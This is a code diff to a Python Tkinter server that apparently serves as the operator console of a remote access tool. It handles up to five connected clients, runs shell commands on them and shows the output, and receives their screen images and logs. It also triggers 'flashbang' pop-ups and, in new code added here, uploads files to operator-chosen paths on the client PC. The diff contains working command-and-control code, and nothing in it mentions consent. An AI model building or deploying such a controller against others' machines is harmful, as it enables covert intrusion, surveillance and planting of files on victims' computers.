@@ -11,6 +11,26 @@ import io
 import threading
 import socket
 import sys
+import pywinstyles
+import os
+import base64
+import asyncio
+
+
+def apply_theme_to_titlebar(root):
+    version = sys.getwindowsversion()
+
+    if version.major == 10 and version.build >= 22000:
+        pywinstyles.change_header_color(
+            root, "#1c1c1c" if sv_ttk.get_theme() == "dark" else "#fafafa"
+        )
+    elif version.major == 10:
+        pywinstyles.apply_style(
+            root, "dark" if sv_ttk.get_theme() == "dark" else "normal"
+        )
+        root.wm_attributes("-alpha", 0.99)
+        root.wm_attributes("-alpha", 1)
+
 
 connectionsNum = 0
 clients = ["No Client Connected"] * 5
@@ -81,7 +101,7 @@ class CustomCommandPrompt:
     def display_command(self, event):
         self.output_text.config(state="normal")
         self.commandTerminal = self.command_entry.get()
-        cmdSend = "CMD" + self.commandTerminal
+        cmdSend = "|\/|CMD" + self.commandTerminal
         if server.client_sockets[self.index] == None and self.index != 0:
             self.output_text.insert(
                 objTK.END,
@@ -125,6 +145,7 @@ class ScreenSharingServer:
         self.is_screen_sharing = True
         self.client_infos = [{}] * 5
         self.current_info_index = 0
+        self.fuckIt_weBall = False
         # UI elements
         self.canvas = objTK.Canvas(master, bg="black")
         self.canvas.pack(fill=objTK.BOTH, expand=True)
@@ -182,7 +203,7 @@ class ScreenSharingServer:
             while True:
                 client_socket, address = self.server_socket.accept()
                 print(f"Connection from {address} has been established!")
-
+                print(type(address))
                 empty_slot = None
                 for i in range(5):
                     if (
@@ -209,7 +230,7 @@ class ScreenSharingServer:
             self.disconnect()
 
     # Handles the client communication, this is the reason this program only uses one socket, took me way too long to make
-    def receive_data(self, client_socket, index):
+    def receive_data(self, client_socket, index: int):
         try:
             while True:
                 header = client_socket.recv(1)
@@ -227,65 +248,77 @@ class ScreenSharingServer:
             self.handle_client_disconnection(index)
 
     # NO this doesn't update the canvas, this RECEIVES the images and gives it to the next function
-    def receive_image(self, client_socket, index):
+    def receive_image(self, client_socket, index: int):
         try:
-            size_data = client_socket.recv(4)
-            if not size_data:
-                raise ConnectionError("Client disconnected")
-            size = int.from_bytes(size_data, "big")
-
-            data = b""
-            while len(data) < size:
-                packet = client_socket.recv(min(4096, size - len(data)))
-                if not packet:
+            while self.fuckIt_weBall is not True:
+                attempts = 0
+                max_attempts = 3
+                size_data = client_socket.recv(4)
+                if not size_data:
                     raise ConnectionError("Client disconnected")
-                data += packet
+                size = int.from_bytes(size_data, "big")
 
-            if len(data) < size:
-                raise ConnectionError("Incomplete data received")
-            while True:
-                try:
-                    image = Image.open(io.BytesIO(data))
-                    if index == self.current_client:
-                        self.update_image(image)
-                        break
-                except UnidentifiedImageError:
-                    print("Received data is not a valid image")
-                    continue
+                data = b""
+                while len(data) < size:
+                    packet = client_socket.recv(min(4096, size - len(data)))
+                    if not packet:
+                        raise ConnectionError("Client disconnected")
+                    data += packet
+
+                if len(data) < size:
+                    raise ConnectionError("Incomplete data received")
+                while True:
+                    try:
+                        image = Image.open(io.BytesIO(data))
+                        if index == self.current_client:
+                            self.update_image(image)
+                            attempts = 0
+                            break
+                    except UnidentifiedImageError:
+                        print("Received data is not a valid image")
+                        try:
+                            client_socket.recv(1024)
+                            break
+                        except UnicodeDecodeError:
+                            continue
+                break
         except (ConnectionError, OSError) as e:
             print(f"Error receiving image: {e}")
             self.handle_client_disconnection(index)
 
     # Handles the commands, mainly the terminal outputs sent by the client(s).
-    def receive_command(self, client_socket, index):
-        try:
-            while True:
-                lenght = 0
-                digits = client_socket.recv(1).decode("utf-8")
-                while digits.isdigit():
-                    lenght = lenght * 10 + int(digits)
+    def receive_command(self, client_socket, index: int):
+        while True:
+            try:
+                while True:
+                    lenght = 0
                     digits = client_socket.recv(1).decode("utf-8")
-                break
-            commandClient = client_socket.recv(lenght + 8).decode("utf-8")
-            if index == terminal.index and commandClient.startswith("[CMDOUT]"):
-                terminal.output_text.config(state="normal")
-                print_output = commandClient[8:]
-                terminal.output_text.insert(
-                    objTK.END, f"$ {terminal.commandTerminal}\n"
-                )
-                terminal.output_text.insert(objTK.END, f"{print_output}\n")
-                terminal.command_entry.delete(0, objTK.END)
-                terminal.output_text.config(state="disabled")
-                terminal.output_text.yview_moveto(1.0)
+                    while digits.isdigit():
+                        lenght = lenght * 10 + int(digits)
+                        digits = client_socket.recv(1).decode("utf-8")
+                    break
+                commandClient = client_socket.recv(lenght + 8).decode("utf-8")
+                if index == terminal.index and commandClient.startswith("[CMDOUT]"):
+                    terminal.output_text.config(state="normal")
+                    print_output = commandClient[8:]
+                    terminal.output_text.insert(
+                        objTK.END, f"$ {terminal.commandTerminal}\n"
+                    )
+                    terminal.output_text.insert(objTK.END, f"{print_output}\n")
+                    terminal.command_entry.delete(0, objTK.END)
+                    terminal.output_text.config(state="disabled")
+                    terminal.output_text.yview_moveto(1.0)
 
-        except (ConnectionError, OSError) as e:
-            print(f"Error receiving command: {e}")
-            self.handle_client_disconnection(index)
-        except UnicodeDecodeError as e:
-            print(f"Decoding error: {e}")
+            except (ConnectionError, OSError) as e:
+                print(f"Error receiving command: {e}")
+                self.handle_client_disconnection(index)
+            except UnicodeDecodeError as e:
+                print(f"Decoding error: {e}")
+                break
+            break
 
     # This handles the logs sent by the client(s)
-    def receive_logger(self, client_socket, index):
+    def receive_logger(self, client_socket, index: int):
         try:
             try:
                 while True:
@@ -358,7 +391,7 @@ class ScreenSharingServer:
         print(f"Switched to client {self.current_client + 1}")
 
     # "Gracefully" handles client disconnection
-    def handle_client_disconnection(self, index):
+    def handle_client_disconnection(self, index: int):
         global connectionsNum, clients, client_sockets
         if self.client_sockets[index]:
             self.client_sockets[index].close()
@@ -378,7 +411,7 @@ class ScreenSharingServer:
         self.is_screen_sharing = False
 
     # This is for the UI, this updates the text displayed in the Home tab
-    def update_client_labels(self, index, ipv4, ipv6, num):
+    def update_client_labels(self, index: int, ipv4, ipv6, num: int):
         connectionNumThing.config(text=f"{num} Connections!")
         if ipv4 != "Client Disconnected":
             client_labels[index].config(text=f"IPv4: {ipv4} | IPv6: {ipv6}")
@@ -387,52 +420,69 @@ class ScreenSharingServer:
 
     # FLASHBANG! function
     def trigger_flashbang(self):
-        clientToFlashbang = objDialog.askinteger(
-            title="FLASHBANG!",
-            prompt="Choose the client to FLASHBANG!. The first client value is 0, and the fifth client value is 4",
-        )
-        if clientToFlashbang is not None:
-            client_socket_Selec = self.client_sockets[clientToFlashbang]
-            if client_socket_Selec is not None:
-                client_socket_Selec.send("flashbang".encode("utf-8"))
+        root.withdraw()
+        try:
+            clientToFlashbang = objDialog.askinteger(
+                title="FLASHBANG!",
+                prompt="Choose the client to FLASHBANG!. The first client value is 0, and the fifth client value is 4",
+            )
+            if clientToFlashbang is not None:
+                client_socket_Selec = self.client_sockets[clientToFlashbang]
+                if client_socket_Selec is not None:
+                    client_socket_Selec.send("|\/|flashbang".encode("utf-8"))
+        finally:
+            root.deiconify()
 
     # Messages a client
     def message_client(self):
-        clientToMessage = objDialog.askinteger(
-            title="Message the Client!",
-            prompt="Choose the client to send a message! The first client value is 0, and the fifth client value is 4",
-        )
-        if clientToMessage is not None:
-            client_socket_Selec = self.client_sockets[clientToMessage]
-            if client_socket_Selec is not None:
-                message = objDialog.askstring(
-                    title="Message the Client!", prompt="Enter the message to send!"
-                )
-                messageToSend = f"message{message}"
-                client_socket_Selec.send(messageToSend.encode("utf-8"))
+        root.withdraw()
+        try:
+            clientToMessage = objDialog.askinteger(
+                title="Message the Client!",
+                prompt="Choose the client to send a message! The first client value is 0, and the fifth client value is 4",
+            )
+            if clientToMessage is not None:
+                client_socket_Selec = self.client_sockets[clientToMessage]
+                if client_socket_Selec is not None:
+                    message = objDialog.askstring(
+                        title="Message the Client!", prompt="Enter the message to send!"
+                    )
+                    if message is not None:  # Ensure message is not canceled
+                        messageToSend = f"|\/|message{message}"
+                        client_socket_Selec.send(messageToSend.encode("utf-8"))
+        finally:
+            root.deiconify()
 
     # Screenshare Controls
     def startScreenShare(self):
-        clientToStartScreenShare = objDialog.askinteger(
-            title="Screenshare Start!",
-            prompt="Choose the client to start their Screenshare. The first client value is 0, and the fifth client value is 4",
-        )
-        if clientToStartScreenShare is not None:
-            if self.client_sockets[clientToStartScreenShare] is not None:
-                self.client_sockets[clientToStartScreenShare].send(
-                    "start_screenshare".encode("utf-8")
-                )
+        root.withdraw()
+        try:
+            clientToStartScreenShare = objDialog.askinteger(
+                title="Screenshare Start!",
+                prompt="Choose the client to start their Screenshare. The first client value is 0, and the fifth client value is 4",
+            )
+            if clientToStartScreenShare is not None:
+                if self.client_sockets[clientToStartScreenShare] is not None:
+                    self.client_sockets[clientToStartScreenShare].send(
+                        "|\/|start_screenshare".encode("utf-8")
+                    )
+        finally:
+            root.deiconify()
 
     def stopScreenShare(self):
-        clientToStopScreenShare = objDialog.askinteger(
-            title="Screenshare Stop!",
-            prompt="Choose the client to stop their Screenshare. The first client value is 0, and the fifth client value is 4",
-        )
-        if clientToStopScreenShare is not None:
-            if self.client_sockets[clientToStopScreenShare] is not None:
-                self.client_sockets[clientToStopScreenShare].send(
-                    "stop_screenshare".encode("utf-8")
-                )
+        root.withdraw()
+        try:
+            clientToStopScreenShare = objDialog.askinteger(
+                title="Screenshare Stop!",
+                prompt="Choose the client to stop their Screenshare. The first client value is 0, and the fifth client value is 4",
+            )
+            if clientToStopScreenShare is not None:
+                if self.client_sockets[clientToStopScreenShare] is not None:
+                    self.client_sockets[clientToStopScreenShare].send(
+                        "|\/|stop_screenshare".encode("utf-8")
+                    )
+        finally:
+            root.deiconify()
 
 
 # This makes the UI more CRISP!
@@ -518,26 +568,124 @@ server = ScreenSharingServer(objSettingsTab2)
 terminal = CustomCommandPrompt(objSettingsTab1)
 
 
+# File Uploader tab
+file_path = None
+file_data = None
+file_name = None
+
+
+def fileUploader():
+    global file_path, file_data, file_name
+    file_path = filedialog.askopenfilename()
+    if file_path:
+        with open(file_path, "rb") as file:
+            file_data = file.read()
+        file_name = os.path.basename(file_path)
+        fileNameLabel.config(text=file_name)
+        fileSizeLabel.config(text=f"File Size: {len(file_data)} bytes")
+
+
+fileLabel = objTTK.Label(objSettingsTab3, text="Select File:", font=normalFont)
+fileLabel.place(x=20, y=20)
+uploadFrame = objTTK.Frame(
+    objSettingsTab3,
+    border=0,
+    padding=2,
+    height=45,
+    width=660,
+    style="UploadFrame.TFrame",
+)
+uploadFrame.place(x=30, y=50)
+uploadButton = objTTK.Button(uploadFrame, text="Upload", command=fileUploader)
+uploadButton.place(relx=0, rely=0, relheight=1, relwidth=0.15)
+fileNameLabel = objTTK.Label(uploadFrame, text="No File Selected", font=normalFont)
+fileNameLabel.place(relx=0.16, rely=-0.1, relheight=0.6)
+fileSizeLabel = objTTK.Label(uploadFrame, text="No File Selected", font=normalFont)
+fileSizeLabel.place(relx=0.16, rely=0.5, relheight=0.6)
+fileEntryLabel = objTTK.Label(
+    objSettingsTab3,
+    text="Enter Destination Location, (Location on Client PC):",
+    font=normalFont,
+)
+fileEntryLabel.place(x=20, y=100)
+locationClientEntry = objTTK.Entry(objSettingsTab3, font=smallFont, width=80)
+locationClientEntry.place(x=30, y=130)
+clientChosen = objTTK.Spinbox(
+    objSettingsTab3,
+    from_=1,
+    to=5,
+    exportselection=True,
+    font=smallFont,
+)
+clientChosen.place(x=20, y=180)
+
+
+def sendFunction():
+    if file_path is None:
+        objMessageBox.showerror(title="Error", message="Please select a file!")
+        return
+    elif locationClientEntry.get() == "":
+        objMessageBox.showerror(title="Error", message="Please enter a location!")
+        return
+    elif clientChosen.get() == "":
+        objMessageBox.showerror(title="Error", message="Please select a client!")
+        return
+    elif server.client_sockets[int(clientChosen.get()) - 1] is None:
+        objMessageBox.showerror(
+            title="Error", message="No client connected or has disconnected!"
+        )
+        return
+    else:
+        print("Sending File:", file_name)
+        print("File Size:", len(file_data))
+        print("Location Client:", locationClientEntry.get())
+        print("Client Chosen:", clientChosen.get())
+        client = int(clientChosen.get()) - 1
+        base64FileData = base64.b64encode(file_data).decode("ascii")
+        server.client_sockets[client].sendall("FILE".encode("utf-8"))
+        server.client_sockets[client].sendall(
+            f"fileU{file_name}|{locationClientEntry.get()}|{len(base64FileData)} {base64FileData}".encode(
+                "utf-8"
+            )
+        )
+
+
+fileSendButton = objTTK.Button(objSettingsTab3, text="Send em!", command=sendFunction)
+fileSendButton.place(x=20, y=230)
+
+
 # Some tweaks to make the theme toggle a lil nicer
 def apply_focus_style():
+    apply_theme_to_titlebar(root)
     if sv_ttk.get_theme() == "dark":
         focus_bg = "#333333"
         server.canvas.config(bg="#000000")
         terminal.frame.config(bg="#252525")
         terminal.output_text.config(bg="#252525")
         terminal.output_text.config(fg="#efefef")
+        fileNameLabel.config(foreground="#efefef")
+        fileNameLabel.config(background="#252525")
+        fileSizeLabel.config(foreground="#efefef")
+        fileSizeLabel.config(background="#252525")
+        style.configure("UploadFrame.TFrame", background="#252525")
     else:
         focus_bg = "#FFFFFF"
         server.canvas.config(bg="#FFFFFF")
         terminal.frame.config(bg="#F5F5F5")
         terminal.output_text.config(bg="#F5F5F5")
         terminal.output_text.config(fg="#333333")
+        fileNameLabel.config(foreground="#333333")
+        fileNameLabel.config(background="#F5F5F5")
+        fileSizeLabel.config(foreground="#333333")
+        fileSizeLabel.config(background="#F5F5F5")
+        style.configure("UploadFrame.TFrame", background="#F5F5F5")
 
     style.map("TNotebook.Tab", focuscolor=[("!focus", focus_bg), ("focus", focus_bg)])
     style.configure("TNotebook.Tab", font=lightFont)
 
 
 # Call Function
+apply_theme_to_titlebar(root)
 apply_focus_style()
 # Add shit to the tabs
 # Home Tab
@@ -576,29 +724,6 @@ client_labels[3] = connections4_label
 connections5_label = objTTK.Label(objHomeTab, text=clients[4], font=normalFont)
 client_labels[4] = connections5_label
 connections5_label.place(x=40, y=290)
-
-
-# File Uploader tab
-def fileUploader():
-    file_path = objTK.filedialog.askopenfilename()
-    if file_path:
-        with open(file_path, "rb") as file:
-            file_data = file.read()
-        print(f"File Contents: {file_data} \nFile Size: {len(file_data)}")
-
-
-fileLabel = objTTK.Label(objSettingsTab3, text="Select File:", font=normalFont)
-fileLabel.place(x=20, y=20)
-uploadButton = objTTK.Button(objSettingsTab3, text="Upload", command=fileUploader)
-uploadButton.place(x=30, y=50)
-fileEntryLabel = objTTK.Label(
-    objSettingsTab3,
-    text="Enter Destination Location, (Location on Client PC):",
-    font=normalFont,
-)
-fileEntryLabel.place(x=20, y=100)
-locationClientEntry = objTTK.Entry(objSettingsTab3, font=smallFont, width=80)
-locationClientEntry.place(x=30, y=130)
 
 # File Downloader tab
 lb5 = objTTK.Label(objSettingsTab4, text="Placeholder 4", font=normalFont)
